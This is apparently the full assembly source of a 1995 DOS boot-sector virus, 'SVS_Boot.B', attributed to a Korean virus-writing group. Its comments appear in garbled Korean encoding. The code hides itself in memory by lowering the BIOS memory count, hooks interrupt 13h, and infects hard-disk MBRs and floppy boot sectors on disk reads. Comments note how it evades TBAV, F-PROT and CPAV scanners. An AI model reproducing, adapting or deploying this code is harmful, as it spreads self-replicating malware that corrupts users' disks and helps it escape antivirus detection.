;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                            SVS_Boot (Type B)
;                            *****************
;
; ·¡Ÿq : SVS_Boot.B
; ”aŸe ·¡Ÿq : Assassin_Boot.B
; ¹A¸b¸a : ¤a·¡œá¯a· ‹¡¬a (KOV : Knight Of Virus)
; ‹až“ : ¬á¶‰ ¤a·¡œá¯a µeÐs (SVS : Seoul Virus Society)
; ¹A¸b»¡ : ÐeŠ‚ (95.8.11)
;
; ´å´á : MASM / TASM
; ¹·ŸA : ¦Ëa / MBR
;
; ¬é¡w : KOV ˆa ¹A¸bÐe ¦Ëa ¤a·¡œá¯a¡ MBR µA »¢¸ó ‰sÁa°á ¤áŸ¥”a.
;        ¸aÁA ¦Ë· ‹¡“w·i ˆa»¡‰¡ ·¶”a.
;
;        ·©¤e ‹¡´â ¸w­¡ µwµb·i 1 KB º‰·¥”a.
;
; * SVS_Boot.A  : ÂAÁ¡ ¤á¸å·¡”a. 94‘eµA ¹A¸b–A´ö”a‰¡ Ðe”a.
;                 360 KB ¶w·a¡ ¹A¸b–A´ö”a.
; ! SVS_Boot.B  : 1.2MB —¡¯aÇa•¡ ˆqµq ¯¡Ç¥”a.
;
;
;
;
;
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 BOOT          SEGMENT PARA 'BOOT'
               ASSUME  CS:Boot, DS:Boot

 Start:        Jmp     Virus_Start           ; ¸ñÏa
               DB      59 dup (?)            ; BPB µwµb

;      TASM ·a¡ ÄñÌa·© Ði˜ BPB µwµb·i ¹± ¤aŽ´á Ðiˆõ·¡”a.
;    MS-DOS 5.0 µA  x‰A ¹A¸b–A´ö”a. /C µ³­e·i º¡e 60 ·a¡
;    ‹©‰A Ð´¡Ðe”a.
 Virus_Start:
               cli                           ; ¯aÈ‚ ¹¡¸é
               xor     ax,ax                 ; AX=0000
               mov     ds,ax                 ; DS=0000
               mov     ss,ax                 ; SS=0000
               mov     sp,07c00h             ; SP=7C00h
               sti

; SCAN ·e 413hˆa ˆñÂ‰–A¡e ¦Ëa ¤a·¡œá¯aœa‰¡ »¥”eÐe”a.
; Àq‰¡¡ ·¡ ¤a·¡œá¯a“e TBAV,F-PROT µA¬á »¥”e´e–E”a.

               CLD
               mov     bx,1304h              ; Unknown µA ˆñÂ‰–A»¡ ´g‹¡¶áÐq
               xchg    bh,bl                 ; BX =  0413h
               dec     word ptr ds:[bx]      ; 1KB ˆq­¡(¤a·¡œá¯aˆa ¬a¶w)
               mov     ax,ds:[bx]            ; AXµA º‰´á—e ˆt
               mov     cl,06                 ; ­A‹a åËa ‰¬e
               shl     ax,cl
               mov     es,ax                 ; ES=DOS µA¬á ¬a¶w´eÐa“e ­A‹a åËa

               mov     si,07c00h             ; ¤a·¡œá¯a“e 0000:7C00h µA ¶áÃ¡Ðe”a.
               xor     di,di                 ; DI=0000
               mov     cx, offset Endvirus   ; ‹©·¡
               repz    movsb                 ; ¥¢¬a
               nop                           ; NOP·i ´eÐº¡e µb¯¡ ˆñ¬‚–E”a.
               push    es                    ; ¤a·¡œá¯aˆa ·¶“e ‰µ·a¡ ¸ñÏa
               mov     ax, offset Get_Int13
               push    ax
               retf

 Get_Int13:
               mov     si,004bh              ; Int 13h· ˆt ´è‹¡
               inc     si                    ; CPAV · Viral Code B X
               mov     di,offset OldInt13    ; TBAV · Unkown ·i ¤w»¡Ðaa‰¡
               movsw                         ; ˆt·i ¸á¸wÐe”a.
               movsw

               Push    cs                    ; DS“e CSˆt
               Pop     ds                    ;
               xor     ax,ax                 ; ES=0000 »b, ¸ ¦Ë·Ði‰µ
               mov     es,ax

               cmp     byte ptr ds:[Sector],00 ; ¦Ë· º—·¥ —¡¯aÇa ˆñ¬a
               jnz     FloppyBooting         ; Ïi¡Ï¡·© ‰w¶ Ða—a ˆqµq

               MOV     BX,01AEh              ; Ða—a· ‰w¶ ¤a·¡œá¯a ¦ ˆt·a¡ ¦Ë·
 Next_PAT:     add     BX,+10h
               cmp     byte ptr [BX],80h     ; DOS ¶w ¦Ëa ˆt·¥ˆa?
               jnz     Next_PAT
               MOV     DX,[BX]               ; SI¡ Ða¡e CPAV µA¬á »¥”e–E”a.
               MOV     CX,[BX+02]
               JMP     Read_OrgBoot          ; ¸¦Ë·Ðq

 FloppyBooting:
               mov     dl,80h                ; Ïi¡Ï¡ ‰w¶ Ða—a ˆqµq ¯¡Ç±
               call    Infect_BOOT           ;

               mov     cl,byte ptr ds:[Sector]
               mov     dx,0100h
 Read_OrgBoot:
               mov     bx,07c00h
               mov     ah,02                 ; ¶¥œ ¦Ëa ·ª´á—i·¡‹¡
               call    F_RWBoot2

 ReBoot:       xor     ax,ax                 ; Int 13hŸi ¤a·¡œá¯aˆa Àa»¡Ða‰¡ ”a¯¡ ¦Ë·
               mov     ds,ax
               mov     si,0040h              ; 0:4Ch = Int 13h
               mov     word ptr ds:[SI+0Ch],offset VirInt13
               mov     ds:[SI+0Eh],cs
               DB      0eah,00,7ch,00,00h    ; JMP 0000:7c00h
 Sector        DB      03h                   ; 03=360KB
;     1.2MB ·¡¡e       0Eh                   ; 0E=1.2MB

;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;    ¤a·¡œá¯aˆa ˆa¡À¬á ¬a¶wÐa“e Int 13h
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

 VirInt13:
               cmp     dl,01                 ; C —aœa·¡§a ·¡¡e ˆqµq¹A¶A
               ja      Jump_Int13
               cmp     ah,02                 ; —¡¯aÇa ·ª‹¡ ·¥ˆa?
               jnz     Jump_Int13
               call    Infect_BOOT           ; ˆqµq Ñ¡Â‰

 Jump_Int13:   DB      0Eah                  ; ¸ñÏa
 OldInt13:     DD ?


 Infect_BOOT:
               Push    ax                    ; ¸á¸w
               Push    bx
               Push    cx
               Push    dx
               Push    si
               Push    di
               Push    ds
               Push    es

               Push    cs                    ; CS=DS=ES
               pop     ds
               Push    cs
               pop     es

               mov     ah,02h                ; ¦Ëa ­BÈá ·ª‹¡
               call    F_RWBoot              ; ‹©·¡Ÿi º‰·¡a‰¡ Íw­eÑÁ
               jc      Exit

               mov     ax,DS:[0123h]         ; ¤a·¡œá¯a ˆqµq µa¦ ˆñ¬a
               cmp     ax,DS:[0323h]
               jz      Exit                  ; ˆqµq–A´ö·a¡e {‹¡


 GetBPB_ErrMsg:
               cld
               mov     si,0203h              ; ¶¥œ BPB· ¶w·i ¥¢¬aÐe”a.
               mov     di,0003h
               mov     cl,59
               repz    movsb

               mov     si,offset Endvirus+200h ; µAœá¡A¯¡»¡Ÿi ¥¢¬aÐe”a. ”e, ·¡ˆt·e ¤a·¡œá¯a
               mov     di,offset Endvirus      ; ‹©·¡ˆa ‹©´á»¡¡e ‹aµA  xÂ´á ¤aŽ´á º´á´¡
               mov     cx,512
               sub     cx, offset  Endvirus  ; Ðe”a.
               repz    movsb

               mov     byte ptr ds:[Sector],00 ; 00·¡¡e Ða—a —¡¯aÇa·±
               cmp     dl,80h                ; Ða—a —¡¯aÇa·¥ˆa?
               jz      Write_BV

               mov     ah,03
               Mov     bx,0200h              ; ¶¥œ ¦Ëa ³a‹¡
               mov     cl,03
               mov     dh,01
               cmp     byte ptr ds:[215h],0FDh ; 360KB ¶w·¥ˆa?
               jz      Write_OrgBoot
               mov     cl,0Eh                ; 1.2 MB —¡¯aÇa· žËa {
 Write_OrgBoot:
               call    F_RWBoot2
               mov     byte ptr Sector,cl

 Write_BV:
               mov     ah,03                 ; ¦Ëa ­BÈáµA ¤a·¡œá¯a ³a‹¡
               xor     bx,bx
               call    F_RWBoot1
 Exit:
               pop     es
               pop     ds
               pop     di
               pop     si
               pop     dx
               pop     cx
               pop     bx
               pop     ax
 R_InfectDsk:  RET

;<><><><><><><><><><><><><><><><><><><><><><>
; —¡¯aÇa· ·ª‹¡/³a‹¡ Ñ¡Â‰ Íw­e
;<><><><><><><><><><><><><><><><><><><><><><>
 F_RWBoot:     mov     bx,0200h              ; ¤áÌá º­¡
 F_RWBoot1:    mov     cx,0001h              ; ‹¡¥¥ˆt·e ¦Ëa ­BÈá
               mov     dh,00                 ;
 F_RWBoot2:    mov     al,01                 ;
               mov     di,0003
 callInt13:    pushf
               call    dword ptr cs:OldInt13
               jnc     Return
               dec     di
               jnz     callInt13
               stc
 Return:       ret
 Virus_name    DB      'SVS.B'               ; ¤a·¡œá¯a ·¡Ÿq
 Endvirus:

 Boot          ENDS
               END     START
